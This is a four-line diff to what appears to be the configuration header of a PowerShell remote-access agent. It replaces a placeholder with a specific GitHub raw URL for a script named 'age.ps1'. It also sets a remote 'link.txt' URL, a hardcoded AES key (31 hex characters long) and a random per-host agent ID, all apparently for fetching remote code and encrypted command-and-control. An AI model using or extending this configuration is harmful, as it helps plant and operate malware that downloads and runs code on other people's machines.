@@ -1,4 +1,4 @@
-$GITHUB_RAW_URL = "https://raw.githubusercontent.com/USER/REPO/main/agent_v2.ps1"
+$GITHUB_RAW_URL = "https://raw.githubusercontent.com/mxnxs19/x2/refs/heads/main/age.ps1"
 $LINK_FILE_URL = "https://raw.githubusercontent.com/mxnxs19/x2/refs/heads/main/link.txt"
 $AES_KEY_HEX = "00a22578d5d544d3cc3bf9d29c4ddd3"
 $AGENT_ID = [System.Guid]::NewGuid().ToString().Substring(0,8)
